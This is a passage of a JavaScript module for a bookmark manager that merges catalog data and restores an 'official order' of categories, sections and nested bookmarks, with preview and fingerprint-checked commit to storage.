    bundled = bundled || release; data = clone(data);
    if (complete) {
      delete data._catalog;
      if (source && source._catalog && source._catalog.schema === 1) data._catalog = clone(source._catalog);
    }
    data = prepare(data, bundled);
    if (!complete && source && source._catalog && source._catalog.schema === 1) {
      var incoming = source._catalog;
      // A selective merge only honors a decision that matches the exact local
      // pending change and its bundled destination. Version labels grant nothing.
      pending(data, bundled).changes.forEach(function (change) {
        var decision=incoming.decisions && incoming.decisions[change.id];
        if (decision !== 'skipped' || !equal(signature(incoming.base && incoming.base[change.key]), signature(change.after))) return;
        if (change.after) data._catalog.base[change.key]=clone(change.after); else delete data._catalog.base[change.key];
        data._catalog.decisions[change.id]='skipped';
      });
    }
    return data;
  }

  function restoration(data, scope, bundled) {
    bundled = bundled || release;
    data = prepare(clone(data), bundled); scope = scope || {};
    if (!scope || typeof scope !== 'object' || Array.isArray(scope) || Object.keys(scope).some(function (field) { return field !== 'categoryId' && field !== 'subSectionId'; }) ||
        scope.categoryId !== undefined && typeof scope.categoryId !== 'string' || scope.subSectionId !== undefined && (typeof scope.subSectionId !== 'string' || !scope.categoryId)) throw new Error('Choose a valid official-order scope.');
    var category = scope.categoryId && data.categories.find(function (c) { return c.id === scope.categoryId; });
    if (scope.categoryId && !category || scope.subSectionId && !(category.subSections || []).some(function (s) { return s.id === scope.subSectionId; })) throw new Error('This bookmark section no longer exists.');
    var accepted = data._catalog.accepted, current = records(data), changes = [], eligibleBookmarks = Object.create(null);
    var fingerprint = stamp([scope, data]);
    function change(key, item, patch) {
      var before = {}, after = {};
      Object.keys(patch).forEach(function (field) { if (!equal(item[field], patch[field])) { before[field] = item[field]; after[field] = patch[field]; item[field] = patch[field]; } });
      if (Object.keys(after).length) changes.push({ key:key, title:item.title || item.id, before:before, after:after });
    }
    Object.keys(accepted).forEach(function (key) {
      var official = accepted[key], saved = current[key];
      if (!saved || data._catalog.tombstones[key]) return;
      var item = findItem(data, key), value = official.value;
      if (official.kind === 'category') {
        if (!scope.categoryId) { var patch = {}; if (typeof value.side === 'string') patch.side = value.side; if (typeof value.order === 'number') patch.order = value.order; change(key, item, patch); }
      } else if (official.kind === 'bookmark') {
        // Restore relative order in an existing destination. Moving a built-in to
        // another category/folder remains a personal decision, including globally.
        if (saved.parent !== official.parent) return;
        var top = saved, target = official;
        while (top.parent && current['bookmark:' + top.parent] && accepted['bookmark:' + target.parent]) { top = current['bookmark:' + top.parent]; target = accepted['bookmark:' + target.parent]; }
        if (top.parent || target.parent || top.value.categoryId !== target.value.categoryId || top.value.subSectionId !== target.value.subSectionId) return;
        if (scope.categoryId && top.value.categoryId !== scope.categoryId || scope.subSectionId && top.value.subSectionId !== scope.subSectionId) return;
        eligibleBookmarks[key] = true;
        if (typeof value.order === 'number' && Number.isFinite(value.order)) change(key, item, { order:value.order });
      }
    });
    data.categories.forEach(function (cat) {
      if (scope.subSectionId || scope.categoryId && scope.categoryId !== cat.id) return;
      var sections = cat.subSections || [], eligible = sections.filter(function (section) { return !!accepted['section:' + cat.id + ':' + section.id] && !data._catalog.tombstones['section:' + cat.id + ':' + section.id]; });
      var acceptedKeys = Object.keys(accepted);
      var sorted = eligible.slice().sort(function (a, b) {
        var ak = 'section:' + cat.id + ':' + a.id, bk = 'section:' + cat.id + ':' + b.id;
        var av = accepted[ak].value.order, bv = accepted[bk].value.order;
        return (typeof av === 'number' ? av : acceptedKeys.indexOf(ak)) - (typeof bv === 'number' ? bv : acceptedKeys.indexOf(bk));
      }), index = 0, before = sections.map(function (s) { return s.id; });
      cat.subSections = sections.map(function (section) { return eligible.indexOf(section) === -1 ? section : sorted[index++]; });
      if (!equal(before, cat.subSections.map(function (s) { return s.id; }))) changes.push({ key:'sections:' + cat.id, title:cat.title + ' sections', before:{ sectionIds:before }, after:{ sectionIds:cat.subSections.map(function (s) { return s.id; }) } });
      eligible.forEach(function (section) { var key = 'section:' + cat.id + ':' + section.id, value = accepted[key].value; if (typeof value.order === 'number') change(key, section, { order:value.order }); });
    });
    // Some historical nested renderers follow array position, while newer views
    // use order. Reorder only official slots and leave every personal child intact.
    function nested(items) {
      items.forEach(function (parent) {
        if (!Array.isArray(parent.subBookmarks)) return;
        var children = parent.subBookmarks || [], before = children.map(function (child) { return child.id; });
        var eligible = children.filter(function (child) { var key = 'bookmark:' + child.id; return eligibleBookmarks[key] && accepted[key] && accepted[key].parent === parent.id && typeof accepted[key].value.order === 'number'; });
        var sorted = eligible.slice().sort(function (a, b) { return a.order - b.order; }), i = 0;
        parent.subBookmarks = children.map(function (child) { return eligible.indexOf(child) === -1 ? child : sorted[i++]; });
        if (!equal(before, parent.subBookmarks.map(function (child) { return child.id; }))) changes.push({ key:'children:' + parent.id, title:parent.title + ' links', before:{ childIds:before }, after:{ childIds:parent.subBookmarks.map(function (child) { return child.id; }) } });
        nested(parent.subBookmarks);
      });
    }
    nested(data.bookmarks);
    return { data:data, scope:clone(scope), count:changes.length, changes:changes, fingerprint:fingerprint };
  }
  function previewRestore(data, scope, bundled) {
    var result = restoration(data, scope, bundled); delete result.data; return result;
  }
  function restoreOrder(data, scope, bundled) { return restoration(data, scope, bundled).data; }
  function commitRestore(storage, scope, expected, bundled) {
    var raw = storage.getItem(key);
    if (raw === null) throw new Error('The collection changed. Reopen Restore Official Order.');
    var result = restoration(JSON.parse(raw), scope, bundled);
    if (expected && expected !== result.fingerprint) throw new Error('Your bookmarks changed. Review the official-order preview again.');
    storage.setItem(key, JSON.stringify(result.data));
    return result.data;
  }

  return { seedPicks:seedPicks, defaults:defaults, release:release, fresh:fresh, load:load, prepare:prepare, pending:pending, merge:merge, commit:commit, validate:validate, imported:imported, records:records,
    previewRestore:previewRestore, restoreOrder:restoreOrder, commitRestore:commitRestore, applyOfficialOrder:applyOfficialOrder };
}));
